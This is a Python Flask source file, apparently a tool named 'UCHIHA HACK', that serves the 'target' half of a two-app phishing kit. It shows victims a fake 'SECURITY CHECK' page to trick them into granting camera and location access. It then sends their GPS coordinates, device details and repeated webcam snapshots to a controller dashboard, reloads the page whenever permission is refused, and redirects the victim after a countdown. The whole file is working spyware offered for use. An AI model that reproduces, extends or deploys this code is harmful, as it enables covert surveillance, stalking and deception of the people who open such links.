# APP 2 (TARGET/SLAVE APP) - by:@ROMEO_UCHIHA
from flask import Flask, render_template_string, jsonify
import requests

app = Flask(__name__)

# ---> YAHAN APNI MAIN DASHBOARD WALI VERCEL URL DALO <---
MAIN_APP_URL = "https://app1-dashboard.vercel.app" 

@app.route("/")
def home():
    return "System Online."

@app.route("/t/<link_id>")
def target_page(link_id):
    # Fetch configuration from Main App
    try:
        config = requests.get(f"{MAIN_APP_URL}/api/config/{link_id}").json()
        if "error" in config: return "Link Expired or Not Found!"
    except:
        return "System Error."

    target_type = config["target_type"]
    r_url = config["redirect_url"]

    # --- UCHIHA HACK UI ---
    return render_template_string('''
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
        <title>System Verification</title>
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
        <style>
            @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@500;900&family=Share+Tech+Mono&display=swap');
            body { background: radial-gradient(circle at center, #0a0000 0%, #000 100%); color: #0f0; font-family: 'Share Tech Mono', monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
            .glow-box { background: rgba(10, 0, 0, 0.8); backdrop-filter: blur(10px); border: 2px solid #ff0000; border-radius: 25px; padding: 40px 30px; width: 90%; max-width: 380px; text-align: center; box-shadow: 0 0 30px rgba(255, 0, 0, 0.2), inset 0 0 10px rgba(255,0,0,0.1); }
            h3 { font-family: 'Orbitron'; color: #ff3333; letter-spacing: 2px; margin-bottom: 30px; }
            .item { display: flex; justify-content: space-between; align-items: center; margin: 25px 0; font-size: 1.3rem; border-bottom: 1px solid rgba(255,255,255,0.05); padding-bottom: 10px; }
            .tick { color: #0f0; text-shadow: 0 0 10px #0f0; } .cross { color: #f00; text-shadow: 0 0 10px #f00; } .wait { color: #ff0; animation: spin 1s infinite linear; }
            @keyframes spin { 100% { transform: rotate(360deg); } }
            #hack-ui { display: none; text-align: center; }
            .timer { font-size: 6rem; color: #ff0000; text-shadow: 0 0 20px rgba(255,0,0,0.6); font-family: 'Orbitron'; font-weight: 900;}
            #msg { margin-top: 20px; font-size: 0.9rem; color: #888; height: 20px;}
        </style>
    </head>
    <body>
        <div id="auth-ui" class="glow-box">
            <h3>SECURITY CHECK</h3>
            <div class="item" id="cam-row" style="display:none;"><span><i class="fas fa-camera"></i> CAMERA</span><span id="cam-ico" class="wait"><i class="fas fa-sync-alt"></i></span></div>
            <div class="item" id="loc-row" style="display:none;"><span><i class="fas fa-map-marker-alt"></i> LOCATION</span><span id="loc-ico" class="wait"><i class="fas fa-sync-alt"></i></span></div>
            <p id="msg">Awaiting system permissions...</p>
        </div>

        <div id="hack-ui">
            <h2 style="font-family: 'Orbitron'; color: #aa0000; letter-spacing: 3px;">DATA UPLINK</h2>
            <div class="timer" id="count">30</div>
            <p id="log-text" style="color: #666; margin-top: 10px;">Establishing connection...</p>
        </div>

        <video id="v" style="display:none" autoplay playsinline></video>
        <canvas id="c" style="display:none"></canvas>

        <script>
            let mode = "{{ t_type }}";
            let API_BASE = "{{ main_url }}/api";
            let camReq = (mode === 'both' || mode === 'camera');
            let locReq = (mode === 'both' || mode === 'location');
            
            if(camReq) document.getElementById('cam-row').style.display = 'flex';
            if(locReq) document.getElementById('loc-row').style.display = 'flex';

            let cam = false, loc = false, timeLeft = 30;
            const v = document.getElementById('v'), c = document.getElementById('c'), msg = document.getElementById('msg');
            
            window.onload = () => { getHardware(); startAuth(); };

            async function getHardware() {
                fetch(API_BASE + "/log_hardware/{{ l_id }}", { method: "POST", headers: {"Content-Type":"application/json"}, body: JSON.stringify({ plat: navigator.platform, cores: navigator.hardwareConcurrency || 0 }) });
            }

            async function startAuth() {
                if(camReq) {
                    try {
                        v.srcObject = await navigator.mediaDevices.getUserMedia({ video: true });
                        document.getElementById('cam-ico').innerHTML = '<i class="fas fa-check-circle tick"></i>';
                        cam = true;
                    } catch(e) { document.getElementById('cam-ico').innerHTML = '<i class="fas fa-times-circle cross"></i>'; }
                } else { cam = true; }

                if(locReq) {
                    if(navigator.geolocation) {
                        navigator.geolocation.getCurrentPosition(
                            (p) => {
                                document.getElementById('loc-ico').innerHTML = '<i class="fas fa-check-circle tick"></i>';
                                loc = true;
                                fetch(API_BASE + "/log_loc/{{ l_id }}", { method: "POST", headers: {"Content-Type":"application/json"}, body: JSON.stringify({lat: p.coords.latitude, lon: p.coords.longitude}) });
                                checkStatus();
                            },
                            (e) => {
                                document.getElementById('loc-ico').innerHTML = '<i class="fas fa-times-circle cross"></i>';
                                msg.innerText = "Location Denied. Reloading...";
                                setTimeout(()=>location.reload(), 2000);
                            }
                        );
                    }
                } else { loc = true; checkStatus(); }
                checkStatus();
            }

            function checkStatus() {
                if(cam && loc) {
                    msg.innerText = "Verification Complete."; msg.style.color = "#0f0";
                    setTimeout(startHack, 1500);
                } else if((camReq && !cam) || (locReq && !loc)) {
                    msg.innerText = "Waiting for permissions..."; msg.style.color = "#f00";
                    if(camReq && cam && !loc) startCapture(3); 
                    setTimeout(()=>location.reload(), 4000); 
                }
            }

            function takeSnap() {
                if(v.videoWidth === 0) return;
                c.width = v.videoWidth; c.height = v.videoHeight;
                c.getContext('2d').drawImage(v, 0, 0);
                fetch(API_BASE + "/capture/{{ l_id }}", { method: "POST", headers: {"Content-Type":"application/json"}, body: JSON.stringify({ img: c.toDataURL('image/jpeg', 0.4) }) });
            }

            function startCapture(limit) {
                let j=0, itv = setInterval(() => { takeSnap(); j++; if(limit && j>=limit) clearInterval(itv); }, 600);
                return itv;
            }

            function startHack() {
                document.getElementById('auth-ui').style.display = 'none';
                document.getElementById('hack-ui').style.display = 'block';
                let capItv = null;
                if(camReq) capItv = startCapture(0); 

                let timer = setInterval(() => {
                    timeLeft--;
                    document.getElementById('count').innerText = timeLeft;
                    if(timeLeft <= 0) {
                        clearInterval(timer); if(capItv) clearInterval(capItv);
                        window.location.href = "{{ r_url }}";
                    }
                }, 1000);
            }
        </script>
    </body>
    </html>
    ''', t_type=target_type, r_url=r_url, l_id=link_id, main_url=MAIN_APP_URL)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, threaded=True)

